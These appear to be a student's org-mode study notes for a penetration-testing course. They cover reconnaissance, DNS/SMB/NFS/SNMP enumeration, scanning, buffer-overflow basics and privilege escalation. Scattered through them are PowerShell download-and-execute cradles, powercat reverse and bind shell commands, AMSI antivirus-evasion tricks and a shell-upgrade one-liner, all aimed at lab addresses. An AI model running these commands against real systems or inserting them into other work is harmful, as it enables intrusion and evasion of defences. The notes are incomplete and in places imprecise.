     + ~1...5 | ? { $_ % 2 }~ //1 to .5 gives 1 and 0; foreach, if [ (this % 2) -ne 0 ], print this; 
      
**** -f //format operator
     #+begin_quote
     Formats strings by using the format method of string objects. Enter the format string on the left side of the operator and the objects to be formatted on the right side of the operator.
     #+end_quote
     
     + ~"{0} {1,-10} {2:N}" -f 1,"hello",[math]::pi~

*** powershell DownloadFile && *DownloadString*
    + ~powershell -c "(new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/wget.exe','./wget.exe')"~
    + ~iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')~ //load the remote script during the session only 
      
*** powerhsell xxd
    Format-Hex -Path <path> -Count <firstNBytesToShow>

*** @Deprecated ~powercat~ //!triggers amsi
    + ~iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')~ //!triggers amsi
    + ~powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1~ //client mode, port 443, ....ps1 as input(file to be transferred)
    + ~powercat -c 10.11.0.4 -p 443 -e cmd.exe~ //reverse shell...but why bother
    + ~powercat -l -p 443 -e cmd.exe~ //bind shell...but why bother

*** amsi evasion (//"this script contains malicious content and has been blocked by your antivirus software")
     + $evil_0 = "amsicontext"
**** evasion 1: concatenation
     + $not_evil = "amsi" + "context"

**** evasion 2: type-casting
     + $not_evil = [char]97 + [char]109 + [char]115 + [char]99
     + use-a-command $not_evil
     + use-a-command ([char]97 + [char]109 + [char]115 + [char]99)

**** evasion 3: variable-insersion
     + $var = "context"
     + $not_evil = "amsi$var"

**** evasion 4: format-string
     + $not_evil = "amsi{0}{1}" -f "con","text"

**** evasion 5: string-replacement
     + $not_evil = "amsiNOTEVIL" -replace "NOTEVIL", "context"

**** use encoding? 
     + simple base64 encoding now still trigger amsi || Windows virus threat protection

** utility tools
*** wireshark //for more filter info check wiki || ref
    + *capture filter*: ~net 192.168.140.0/24~
    + *display filter*: 
      - ip.addr==192.168.140.128
      - ip.src==192.168.140.128
      - ip.dst==192.168.140.128 and tcp.port==1337
      - tcp

*** tcpdump TODO advanced if necessary
    + ~sudo tcpdump -r dump.pcapng | awk -F " " '{print $3}' | sort | uniq -c | head~ //find the top most frequent active address.
    + ~sudo tcpdump -n src host 192.168.140.1 and port 137 -r dump.pcapng~//n for no hostName converting.
    + ~sudo tcpdump -nX dst host 192.168.140.128 -r dump.pcapng~ //X for hex dump.
    + ~sudo tcpdump -nA dst host 192.168.140.128 -r dump.pcapng~ //A for ASCII, useful for capturing web pages.
    + ~sudo tcpdump -nA 'tcp[13]=24'~ //the 14th bytes of tcp header, i.e. the flag, with ACK and PSH on, echo "$((2#00011000))" -> decimal 24, [check man tcpdump]

**** tcpdump capture //maybe verbose
     + ~sudo tcpdump -X -s0 port 80~ //s0 raise the single package-size limit to >256kb.
     + ~sudo tcpdump -i eth0 -n -s0 -vX port 80~ //verbose

*** Fuzzer
    + AFL, libFuzzer, honggfuzz, KAFL(kernel), syscall fuzzer, syzkaller

** TODO practical examples
*** example 1: grap all subdomain, get ip
    1. wget pages html
    2. grab all urls use regex.
       [[./ut_DumpSubdomainFromFile.py]]
    3. loop through the file in the shell:
       #+begin_src sh
while read p; do host $p >> index_hosts_result; done < index_hosts
       #+end_src
     

   //p123 pass
   
*** example2
    //p125 pass
    TODO grep and analyse raw
    
*** example3
    //namp
    *cutycapt*
    
* Book3_Chapter 06 Passive Information Gathering (OSINT) checklist?
   
** osint tools
*** whois enumeration
   #+begin_src bash
whois <domain>
whois <ip>     # more info
   #+end_src
   + whois.arin.net
   + grep name, etc.
     
*** google search pattern(site:<site>, filetype:<php>)
   + ref: [[https://www.exploit-db.com/google-hacking-database][Google Hacking Database]] 
     #+begin_src 
 + ~-filetype:html~ // non-html pages
intitle: "index of" "parent directory"
     #+end_src

*** netcraft
   + [[https://www.netcraft.com/]]
     - Resources, site report
     - Resources, search dns
       
*** recon-ng (may trigger guard.)
   + recon-ng
     - marketplace search <module>
       + [[https://github.com/lanmaster53/recon-ng-marketplace/wiki/API-Keys][open api keys]]
     - marketplace info <module_path>
     - marketplace install <module_path>

     - modules load <module_path>
       + <modulePrompt>> info
     - options set SOURCE megacorpone.com
     - run                                            // results stored as hosts

     - back
     - show
     - show hosts
     - marketplace info recon/hosts-hosts/resolve
     - marketplace install recon/hosts-hosts/resolve
     - modules load recon/hosts-hosts/resolve
     - info
     - run                                             // use stored hosts info
     - show hosts                                      // ip fields are resolved

*** open-source code
   + github, gitlab, sourceforge
     - github:
       + user:<user> filename:users
       + //tools, e.g. Gitrob, Gitleaks
         
*** shodan
   + // interact with and gather info from internet-connected devices.
     
*** security headers
   [[https://securityheaders.com/]]
   + discover missing defensive headers
     
*** ssl server test
   [[https://www.ssllabs.com/ssltest/]]
     
*** pastebin
   [[https://pastebin.com/]]
   + search in it.
     
** user infomation gathering, credential stuffing
*** email, social media account on the official website
    
*** email harvesting
    + theHarvester [[https://github.com/laramies/theHarvester]]
    + theharvester -d megacorpone.com -b google // domain, datasource

*** password dumps that already existed
    + "rockyou" wordlist. [[https://en.wikipedia.org/wiki/RockYou#Data_breach]]
      
** social media tools
*** social searcher
    [[https://www.social-searcher.com/]]
    
** site specific tools
*** twofi
    https://digi.ninja/projects/twofi.php
    + user's twitter feed -> wordlist

*** linkedin2username
    https://github.com/initstring/linkedin2username
    + linkedin -> username list
      
** stackoverflow
   + if an employee ask questions
     
** information gathering frameworks
*** *OSINT Framework*
    https://osintframework.com/
    + *extremely useful*
      
*** TODO maltego
    https://www.paterva.com/buy/maltego-clients.php
    + indispensable tool for large information gathering operations (PWK, p170)

* Book3_Chapter 07 Active Information Gathering
  + port scanning, DNS, SMB, NFS, SMTP, SNMP enumeration.
    
** DNS enumeration TODO recursor
   + dns client <-> DNS recursor <-> DNS infrastructure
   + the DNS infrastructure:
     + cliient:
     #+begin_quote
     The process starts when a hostname is entered into a browser or other application. The browser passes the hostname to the operating system’s DNS client and the operating system then forwards the request to the external DNS server it is configured to use. This first server in the chain is known as the DNS recursor and is responsible for interacting with the DNS infrastructure and returning the results to the DNS client. The DNS recursor contacts one of the servers in the DNS root zone.
     #+end_quote
     + step 1:
     #+begin_quote
     The DNS recursor contacts *one of the servers in the DNS root zone*. The root server then *responds with the address of the server responsible for the zone containing the Top Level Domain (TLD)*.
     #+end_quote
     + step 2:
     #+begin_quote
     Once the DNS recursor receives the address of the TLD DNS server, it *queries it for the address of the authoritative nameserver* for the megacorpone.com domain.
     #+end_quote
     + step 3:
     #+begin_quote
     The authoritative nameserver is the final step in the DNS lookup process and contains the DNS records in a local database known as *the zone file*. It *typically hosts two zones for each domain, the forward lookup zone that is used to find the IP address of a specific hostname and the reverse lookup zone (if configured by the
administrator), which is used to find the hostname of a specific IP address*.
     #+end_quote
     + client:
     #+begin_quote
     Once the DNS recursor provides the DNS client with the IP address for www.megacorpone.com, the browser can contact the correct web server at its IP address and load the webpage.
     #+end_quote
     
*** dns caching
    #+begin_quote
    To improve the performance and reliability of DNS, DNS caching is used to store local copies of DNS records at various stages of the lookup process. It is for this reason that some modern applications, such as web browsers, keep a separate DNS cache. In addition, the local DNS client of the operating system also maintains its own DNS cache along with each of the DNS servers in the lookup process. Domain owners can also control how long a server or client caches a DNS record via the Time To Live (TTL) field of a DNS record.
    #+end_quote
    
*** dns records common types
    + NS - Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
    + A - Also known as a host record, the “a record” contains the IP address of a hostname (such as www.megacorpone.com).
    + MX - Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
    + PTR - Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address.
    + CNAME - Canonical Name Records are used to create aliases for other host records.
    + TXT - Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.
      
*** ~host~, dns forward/reverse lookup
    #+begin_src sh
    host www.megacorpone.com
    host -t mx megacorpone.com
    host -t txt megacorpone.com
    #+end_src
    
**** forward lookup brute force
     + simplified wordlist /usr/share/seclists
       - Much more comprehensive wordlists are available as part of the SecLists project.
       - [[https://github.com/danielmiessler/SecLists]]
       - sudo apt install seclists
     + usage: 
     #+begin_src sh
     cat list.txt    # www ftp mail own paoxy router
     for ip in $(cat list.txt); do host $ip.megacorpone.com; done
     #+end_src
     
**** reverse lookup brute force
     #+begin_quote
     If the DNS administrator of megacorpone.com configured PTR 191 records for the domain, we could scan the approximate range with reverse lookups to request the hostname for each IP.
     #+end_quote
     + usage:
     #+begin_src sh
     for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"
     #+end_src
     
*** dns zone transfers
    #+begin_quote
    A zone transfer is basically a database replication between related DNS servers in which the zone file is copied from a master DNS server to a slave server. The zone file contains a list of all the DNS names configured for that zone. Zone transfers should only be allowed to authorized slave DNS servers but many administrators misconfigure their DNS servers, and in these cases, anyone asking for a copy of the DNS server zone will usually receive one.
    #+end_quote
    + host -l         # list zone, to attemp the zone transfers
    + useage:         # nameserver is already knowned in the ~host~ result
      #+begin_src sh
      # host -l megacorpone.com <nameserver>
      host -l megacorpone.com ns2.megacorpone.com     # success if the nameserver allows the transfer
      #+end_src
    + TODO test script
  
*** *dns enumeration tools*
   
**** DNSRecon (.py script) TODO try zone transfer
    + usage:
      #+begin_src sh
      dnsrecon -d megacorpone.com -t axfr                 # -d <domainname> -t <typeOfEnumeration>
      dnsrecon -d megacorpone.com -D ~/list.txt -t brt    # forward lookup brute force equivalence
      #+end_src
      
**** DNSenum
    + usage:
      #+begin_src sh
      dnsenum zonetransfer.me
      #+end_src

** port scanning
   + steps:
     1. find possible web servers by scanning 80 443 on the network.
     2. run full port scan on them in the background.
        
*** basic, netcat
    
**** netcat, tcp
    #+begin_src sh
    nc -nvv -w 1 -z 10.11.1.220 3388-3390
    #+end_src
    + process: (handshake if success)
      - open: [SYN] -> [SYN, ACK] -> [FIN, ACK]
      - close: [SYN] -> [RST, ACK]

**** netcat, udp
     #+begin_src sh
     nc -nv -u -z -w 1 10.11.1.115 160-162
     #+end_src
     + process: (server response with ICMP destination unreachable if closed, unreliable)
       - filtered by a firewall or device use none standard implementation
         
*** nmap 
    + sudo if need raw sockets
      #+begin_quote
Raw sockets allow for surgical manipulation of TCP and UDP packets.
      #+end_quote
      
**** iptables, monitoring traffic
     + usage:
     #+begin_src sh
     sudo iptables -I INPUT 1 -s 10.11.1.220 -j ACCEPT
     sudo iptables -I INPUT 1 -s 10.11.1.220 -j ACCEPT
       # --insert <chain>, <rulenum> 1 for topmost, [!] --source <ip>, --jump <rule>(ACCEPT DROP RETURN)
     sudo iptables -I OUTPUT 1 -d 10.11.1.220 -j ACCEPT
     sudo iptables -Z [chain[rulenum]]
       # zero the counters 7 
     sudo iptables -vn -L
       # --numeric, --list [chain], list all rules [of a chain]
     #+end_src
     
**** nmap tcp scan
     + nmap <ip>            # default 1000-port scan, 78KB
     + nmap -p 1-65535 <ip> # all *tcp* ports, 4MB 
     + sudo nmap -sS <ip>   # (not so) stealth/syn scan, 
     + nmap -sT <ip>        # TCP connect scan, default
       - # the connect scan perform TCP handshakes.
       - # hence much slower than -sS since per result only available after the handshake is complete.

**** nmap udp scan
    + sudo nmap -sU 10.11.1.115
      - # for normal ports: use the "ICMP port unreachable" method
      - # for common ports:
        #+begin_quote
        such as port 161, which is used by SNMP, it will send a protocol-specific SNMP packet in an attempt to get a response from an application bound to that port.
        #+end_quote

    + sudo nmap -sS -sU 10.11.1.115  # tcp && udp scan

**** network sweeping
     + usage:
     #+begin_src sh
nmap -sn 10.11.1.1-254                        # (no port scan)
nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt  # greppable output
grep Up ping-sweep.txt | cut -d " " -f 2

nmap -p 80 10.11.1.1-254 -oG web-sweep.txt
nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt 
  # A for enabling OS detection, version detection, script scanning and traceroute
  # the top ports are defined in: /usr/share/nmap/nmap-services
     #+end_src

**** TODO more host discovery technique
     https://nmap.org/book/man-host-discovery.html

**** os fingerprinting
     #+begin_quote
     Nmap has a built-in feature called OS fingerprinting, which can be enabled with the *-O* option. This feature attempts to guess the target’s operating system by inspecting returned packets. This is possible because operating systems often have slightly different implementations of the TCP/IP stack (such as varying default TTL values and TCP window sizes) and these slight variances create a fingerprint that Nmap can often identify.
     #+end_quote

     + usage:
     #+begin_src sh
sudo nmap -O 10.11.1.220
     #+end_src
     
**** banner grabbing/service enumeration
     + usage
     #+begin_src sh
nmap -sV -sS -A 10.11.1.220    # -sV version detection, or banners
     #+end_src
     + TODO track size

**** nmap scripting engine (NSE)
     + /usr/share/nmap/scripts
     + usage:
     #+begin_src sh
nmap 10.11.1.220 --script=smb-os-discovery                   # base usage
nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com    # zone transfer
nmap --script-help dns-zone-transfer                         # script help
     #+end_src
     
***** TODO execise
      + list neighbours
      + -sn and find server
      + nse, smb-os...

      + zone transfer on -sn result | host
      + nse ip

      + wireshark, udp scan packet
      + wireshark, SYN vs connect scan packet
        
*** masscan
    #+begin_quote
Masscan is arguably the fastest port scanner; it can scan the entire Internet in about 6 minutes, transmitting an astounding 10 million packets per second! While it was originally designed to scan the entire Internet, it can easily handle a class A or B subnet, which is a more suitable target range during a penetration test.
    #+end_quote
    + usage:
    #+begin_src sh
sudo masscan -p80 10.0.0.0/8                                 # base usage
sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1
  # rate of package transmission, -e <interface>, --router-ip <gateway>
    #+end_src
    
** TODO server message block (SMB) enumeration (Windows only?)
   + about
     - bad bug records due to "complex implementation and open nature" (PWK, p194)
     - [[http://markgamache.blogspot.ca/2013/01/ntlm-challenge-response-is-100-broken.html]]
     - That said, the SMB protocol has also been updated and improved in parallel with Windows
Operating Systems releases (PWK, p194).
     
*** scanning for the NetBIOS service
    + about NetBIOS:
      #+begin_quote
The NetBIOS service listens on TCP port 139 as well as several UDP ports. It should be noted that SMB (TCP port 445) and NetBIOS are two separate protocols. NetBIOS is an independent session layer protocol and service that allows computers on a local network to communicate with each other. While modern implementations of SMB can work without NetBIOS, NetBIOS over TCP (NBT) is required for backward compatibility and is often enabled together. For this reason, the enumeration of these two services often goes hand-in-hand. These can be scanned with tools like nmap, using syntax similar to the following:
      #+end_quote

    + src: 
      - with nmap:
      #+begin_src sh
nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254
      #+end_src
      - with more specialized tools:
      #+begin_src sh
sudo nbtscan -r 10.11.1.0/24
  # -r Use local port 137(UDP?) for scans. Win95 boxes respond to this only.
      #+end_src
      
**** TODO with Nmap SMB NSE scripts (practice p197)
     #+begin_src sh
ls -1 /usr/share/nmap/scripts/smb*
nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.5
     #+end_src
       
** NFS enumeration
   + about NFS:
   #+begin_quote
    Network File System (NFS) is a distributed file system protocol originally developed by Sun Microsystems in 1984. It allows a user on a client computer to access files over a computer network as if they were on locally-mounted storage.
    NFS is often used with UNIX operating systems and is predominantly insecure in its implementation. It can be somewhat difficult to set up securely, so it’s not uncommon to find NFS shares open to the world. This is quite convenient for us as penetration testers, as we might be able to leverage them to collect sensitive information, escalate our privileges, and so forth.
   #+end_quote
   
*** TODO scanning for NFS shares p197
    + the TCP port 111
    #+begin_quote
    Both *Portmapper* and *RPCbind* run on TCP port 111. RPCbind maps RPC services to the ports on which they listen. RPC processes notify rpcbind when they start, registering the ports they are listening on and the RPC program numbers they expect to serve.
    The client system then contacts rpcbind on the server with a particular RPC program number. The
rpcbind service redirects the client to the proper port number (often TCP port 2049) so it can communicate with the requested service. We can scan these ports with nmap using the following syntax:
      #+end_quote
    + src:
      #+begin_src sh
nmap -v -p 111 10.11.1.1-254
nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
  # nse script, rpcinfo. Connects to portmapper and fetches a list of all registered programs.
      #+end_src

      
*** nmap NFS NSE scripts
    + src:
      #+begin_src sh
ls -1 /usr/share/nmap/scripts/nfs*
nmap -p 111 --script nfs* 10.11.1.72
  # wildcard, run multiple NSE scripts

# Nmap scan report for 10.11.1.72
# PORT
#  STATE SERVICE
# 111/tcp open rpcbind
# | nfs-showmount:
# |_ /home 10.11.0.0/255.255.0.0

sudo mount -o nolock 10.11.1.72:/home /mnt     # -o <mountOptions>, nolock(man 5 nfs)
cd /mnt && ls
      #+end_src
      
** SMTP enumeration : Simple Mail Transport Protocol
   + TODO VRFY && EXPN
   + about SMTP
   #+begin_quote
We can also gather information about a host or network from vulnerable mail servers. The Simple Mail Transport Protocol (SMTP) supports several interesting commands, such as VRFY and EXPN. A VRFY request asks the server to verify an email address, while EXPN asks the server for the membership of a mailing list. These can often be abused to verify existing users on a mail server, which is useful information during a penetration test. 
   #+end_quote
   + src:
     #+begin_src sh
nc -nv 10.11.1.217 25
# (UNKNOWN) [10.11.1.217] 25 (smtp) open
# 220 hotline.localdomain ESMTP Postfix
VRFY root
# 252 2.0.0 root
VRFY idontexist
# 550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table
     #+end_src
   + TODO [[./ut_SMTPEnumerationAuto.py]]

** SNMP enumeration : Simple Network Management Protocol : UDP 161
   + about SNMP
   #+begin_quote
   Over the years, we have often found that the Simple Network Management Protocol (SNMP) is not well-understood by many network administrators. This often results in SNMP misconfigurations, which can result in significant information leakage.

   SNMP is based on UDP, a simple, stateless protocol, and is therefore susceptible to IP spoofing and replay attacks. In addition, the commonly used SNMP protocols 1, 2, and 2c offer no traffic encryption, meaning that SNMP information and credentials can be easily intercepted over a local network. Traditional SNMP protocols also have weak authentication schemes and are commonly left configured with default public and private community strings.
   #+end_quote

*** the SNMP MIB tree : Management Information Base 
    + about MIB
    #+begin_quote
The SNMP Management Information Base (MIB) is a database containing information usually related to network management. The database is organized like a tree, where branches represent different organizations or network functions. The leaves of the tree (final endpoints) correspond to specific variable values that can then be accessed, and probed, by an external user.
    #+end_quote
    + more info:
    [[https://www.ibm.com/support/knowledgecenter/ssw_aix_71/commprogramming/mib.html]]
    
**** find SNMP hosts
    + src:
    #+begin_src sh
sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt
    #+end_src
    + alternative tools, onesixtyone : fast and simple SNMP scanner
      #+begin_quote
which will attempt a brute force attack against a list of IP addresses. First we must build text files containing community strings and the IP addresses we wish to scan:
      #+end_quote
      - src:
      #+begin_src sh
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips
onesixtyone -c community -i ips
  # -c <communityfile>, -i <ipFile>
      #+end_src
      
**** TODO (practice) Windows SNMP enumeration : tool : snmpwalk
     #+begin_quote
     We can probe and query SNMP values using a tool such as snmpwalk provided we at least know the SNMP read-only community string, which in most cases is “public”.
     #+end_quote

     + src:
     #+begin_src sh
snmpwalk -c public -v1 -t 10 10.11.1.14
  # -c <communityStr>, -v <version>, -t <timeout>, <ip>, <MIBString>
snmpwalk -c public -v1 -t 10 10.11.1.14 10.11.1.14 1.3.6.1.4.1.77.1.2.25
  # enumeration  windows users : svUserTable
snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
  # Enumerating Running Windows Processes : hrSWRunEntry
snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
  # Enumerating Open TCP Ports : tcpConnEntry
snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
  # Enumerating Installed Software : hrSWInstalledName
     #+end_src
     
TODO
+ how to know what --script-args
  
* Book3_Chapter 8 Vulnerability Scanning
  + // overview of automated scanning, major tools : Nessus && Nmap
    
** Vulnerability Scanning Overview and Considerations
   
*** How Vulnerability Scanners Work
    1. Detect if a target is up and running.
    2. Conduct a full or partial port scan, depending on the configuration.
    3. Identify the operating system using common fingerprinting techniques.
    4. Attempt to identify running services with common techniques such as banner grabbing, service behavior identification, or file discovery.
    5. Execute a *signature-matching process* to discover vulnerabilities.
    #+begin_quote
    As a part of this signature-matching process, many scanners use banner grabbing, a simple technique where text strings generated during an initial interaction with an application are obtained and analyzed. Some applications generate very specific banners, such as OpenSSH, which may return “SSH-2.0-OpenSSH_7.9p1 Debian-10”, allowing us to precisely pinpoint the application version, while others, such as Apache Tomcat versions 4.1.x to 8.0.x, return a generic HTTP header of “Apache-Coyote/1.1”. 

    Most automated scanners inspect a wide variety of other target information during the signature-matching process. Nevertheless, even a strong signature match does not guarantee the presence of a vulnerability. This means automated scanners can generate quite a few false positives and by contrast, false negatives, in which a vulnerability is overlooked because of a signature mismatch. False positives and negatives can also occur because of backporting, in which package maintainers "roll back" software security patches to older versions. Backporting may result in the scanner flagging software as a vulnerable version when the vulnerability has actually been repaired.
    #+end_quote
    
*** know the target
    + the traffic volume. Throttle scan speed && use timeout at first, increace speed till reaching quality-speed balance.
    + network position.
      #+begin_quote
      Finally, our network positioning can affect target visibility. For example, a typical vulnerability scanner will attempt to discover targets with a ping sweep or ARP scan.224 However, Internet connected targets would not be able to receive ARP traffic from external subnets and may block ICMP (ping) requests,225 meaning the scanner could miss the targets entirely if it has been configured to rely solely on these discovery options.
      #+end_quote
    
*** authenticated vs unauthenticated scanning
    
**** authenticated scan
     #+begin_quote
     Authenticated scans generate a wealth of additional information and produce more accurate results at the expense of a longer scan time. Although an authenticated scan can be used during a penetration test (using discovered credentials, for example), it is more commonly used during the patch management process.
     #+end_quote
    + linux: ssh login as a user
    + windows:
      - Windows Management Instrumentation (WMI) + a domain/local account with remote management permissions.
        [[https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi]]
      - Other factors that may block authentication:
        + User Account Control (UAC):
          [[https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-
account-control-works]]
        + firewall settings
      #+begin_quote
      ...once access is properly configured, most scanners analyze the *system configuration, registry settings, and application and system patch levels*. They also review *files in the Program Files directories* as well as *all supporting executables and DLLs in the Windows folder*, all in an attempt to detect potentially vulnerable software.
      #+end_quote

** Vulnerability Scanning with Nessus
   #+begin_quote
   ...a popular vulnerability scanner that supports a staggering 130,000 plugins228 (vulnerability checks) at the time of this writing. While originally developed as an open source application, in 2005 the source was closed. The change to a closed source model resulted in forks of the open source project, and to the release of OpenVAS. There are many commercial and open source vulnerability scanners with various strengths and weaknesses.
   However, Nessus is a quite capable industry standard, and the free “Essentials” version allows us to scan up to 16 IPs. It gives us insight into how to use the full commercial version without time limits or other constraints. The overall concepts discussed in this section will generally apply to just about any other commercial scanner as well.
   #+end_quote
   + pass? p210~
   + TODO wireshark the Nessus traffic, unathenticated && authenticated.
   + ~p236
     
** Vulnerability Scanning with Nmap : NSE
   #+begin_quote
   As an alternative to Nessus, we can also use the Nmap Scripting Engine (NSE) to perform automated vulnerability scans. While NSE is not a full-fledged vulnerability scanner, it does have a respectable library of scripts that can be used to detect and validate vulnerabilities. NSE scripts are written in Lua and range in functionality from brute force and authentication to detecting and exploiting vulnerabilities. For these purposes we will focus on the scripts in the “vuln” and “exploit” categories, as the former detects a vulnerability and the latter attempts to exploit it.
   However, there is overlap between these categories and some “vuln” scripts may essentially run stripped-down exploits. For this reason, scripts are also further categorized as “safe” or “intrusive” and we should take great care when executing the latter because they may crash a remote service or take down the target.
   #+end_quote
   + src:
     #+begin_src sh
cd /usr/share/nmap/scripts/
head -n 5 script.db                           # the index to all the scripts
cat script.db | grep '"vuln"\|"exploit"'
sudo nmap --script vuln 10.11.1.10
  # run all scripts in the “vuln” category
     #+end_src

* Book3_Chapter 10 Buffer Overflow
** basic
   + ? x64 memory range (low 0x00000000 -> high 0x7FFFFFFF)
   + the stack, LIFO, the return address at bottom.
     - an example *stack frame*:
       | function A return address |   |
       | input param 1             |   |
       | input param 2             |   |
       
*** the x86 register and their nomenclature
    + EAX = (. + AX); AX = (AH + AL)
      - EAX: extra, 32-bit register
      - AX(in EAX): lower 16-bit register
      - AH(in AX): higher 8-bit register
      - AL(in AX): lower 8-bit register
    + the table of x86 register structure
      | 32-bit | lower 16 | higher 8 | lower 8 |
      |--------+----------+----------+---------|
      | EAX    | AX       | AH       | AL      |
      | EBX    | BX       | BH       | BL      |
      | ECX    | CX       | CH       | CL      |
      | EDX    | DX       | DH       | DL      |
      | ESI    | SI       | -        | -       |
      | EDI    | DI       | -        | -       |
      | EBP    | BP       | -        | -       |
      | ESP    | SP       | -        | -       |
      | EIP    | IP       | -        | -       |

      + E[ABCD]X, ESI, EDI: often used as general purpose registers to store temporary data, [[https://wiki.skullsecurity.org/Registers][more info on register (Skull Security, 2012)]] but the primary purpose are as below (quoted OSCP p348):
        - EAX (accumulator): *Arithmetical and logical* instructions
        - EBX (base): Base pointer of the *data section*.
        - ECX (counter): Loop, shift, and rotation counter
        - EDX (data): I/O port addressing, multiplication, and division
        - ESI (source index): Pointer addressing of data and source in string copy operations
        - EDI (destination index): Pointer addressing of data and destination in string copy operations
        - *ESP* (stack pointer): most recently referenced location on the stack(pointer to the *(downmost if stack grow downwards)/lower address* of the stack)
        - *EBP* (base pointer): points to the *base/topmost if stack grows downwards/higher address* of the stack when a function is called, provide easy reference for the function to its own stack frame (via offsets). i.e. the (offset 0 pointer)
        - *EIP* (instruction pointer): points to the *next* instruction to be executed.
          
*** TODO the *function prologue*
    + [[https://www.youtube.com/watch?v=75gBFiFtAb8][x86 Assembly Crash Course(by HackUCF)]]
    + ? the $ESP, $EBP, $EIP change, during call -> leave -> ret.
      #+begin_quote
      [ebp+0xc]  ; contains parameter 1, etc
      [ebp+0x8]  ; contains parameter 0
      [ebp+0x4]  ; contains return address
      [ebp]      ; contains prev-EBP      
      #+end_quote
      
*** the example:
    + [[./staceOverflow/so_Basic.c][so_Basic.c]]

      
** DEP, ASLR, and CFG
   + Data Execution Prevention(DEP): raise an exception when code from data pages executed.
   + Address Space Layout Randomization(ASLR): randomize the base address of loaded applications and DLLs on system reboot.
   + Control Flow Guard(CFG): ?




* Book3_Chapter 14 Locating Public Exploits
  
** Online Exploit Resources
*** The Exploit Database
    [[https://www.exploit-db.com/]]
    
*** SecurityFocus Exploit Archives
    [[https://www.securityfocus.com/]]
    
*** Packet Storm
    [[https://packetstormsecurity.com/]]

** Offline Exploit Resources
    //TODO
    
*** SearchSploit
    + src
    #+begin_src sh
sudo apt update && sudo apt install exploitdb
ls /usr/share/exploitdb/
searchsploit [-o]                             # overflow the window
searchsploit remote smb microsoft windows
searchsploit [-x | -m]                        # examine | mirror to $cwd
    #+end_src
    
*** Nmap NSE scripts
    + src
    #+begin_src sh
cd /usr/share/nmap/scripts
grep Exploits *.nse
nmap --script-help=clamav-exec.nse
    #+end_src
    
*** The Browser Exploitation Framework (BeEF)
    + src
    #+begin_src sh
sudo beef-xss                                 # start service
    #+end_src
    + TODO usage

*** the Metasploit Framework
    + src
    #+begin_src sh
sudo msfconsole -q                            # quiet
search ms08_067
search -h                                     # help
    #+end_src
    + TODO usage
      
*** //TODO p451

* Book3_Chapter 15 fixing the exploit
** TODO bo, manual to find the address quick
** TODO use metasploit and read different ver. of code
   
** TODO the last bit of calloc (memset + paddin g)
   
** TODO lab c p467
   
* Book3_Chapter 16 file transfers
  
** summary
   + src:
   #+begin_src sh
python -m SimpleHTTPServer 80 # python 2
python -m http.server [-h] [--bind IP] [--directory DIR] [PORT]
  # python 3
  # curl -o o.sh 10.10.0.1/o.sh
  # axel -a -n 10 -o o.pdf 10.10.0.1/o.pdf
   #+end_src
  
** Considerations and Preparations
*** Dangers of Transferring Attack Tools
    + backdoor exploited by 3rd party
    + antivirus scan

*** TODO install Pure-FTPd
   + src:
   #+begin_src sh
sudo apt update && sudo apt install pure-ftpd

##setup
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome     | # lab
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd
   #+end_src
   
*** TODO the Non-Interactive shell
    + src:
    #+begin_src sh
ftp <ip>
    #+end_src
    
    + problem:
      - the interactive shell feedback is not visiable to bind/reverse shell user.
        
*** upgrading a Non-Interactive shell # python spawn shell
    + src:
    #+begin_src sh
# in a bind shell
python -c 'import pty; pty.spawn("/bin/bash")'
    #+end_src
    
** Transferring Files with Windows Hosts
   
//TODO


* Book3_Chapter 18 Privilege Escalation
** entry
   + services - misconfigured 
   + services or binaries - insufficient permission restriction
   + kernel - vulnerabilities
   + software running with high privileges - vulnerabilities
   + sensitive information stored on local files
   + ? registry settings that always elevate privilege before executing a binary
   + installation scripts - may contain hard coded credentials
   + etc.
     
** information gathering
   | Enumeratiing        | Linux                     | Windows         |
   |---------------------+---------------------------+-----------------|
   | user                | whoami                    | whoami          |
   |                     | id                        | net user [user] |
   |                     | /etc/passwd               | net user        |
   |                     | /etc/hostname             | hostname        |
   | OS Ver. & Architect | /etc/issue /etc/*-release | systeminfo      |
   |                     | uname -a                  |                 |
   + src
   #+begin_src powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
  #TODO
   #+end_src
   #+begin_src sh
cat /etc/issue
cat /etc/*-release
   #+end_src
   
//TODO 516 ~ 560 lab

* Book3_Chapter 19 Password Attacks
  
** TODO 560~585 wordlist, etc

** Leveraging Password Hashes
*** Retrieving Password Hashes
    + src:
    #+begin_src sh
hashid '<hash>'                # hashtype analyse
    #+end_src
    
**** Windows::Security Accounts Manager(SAM) : mimikatz
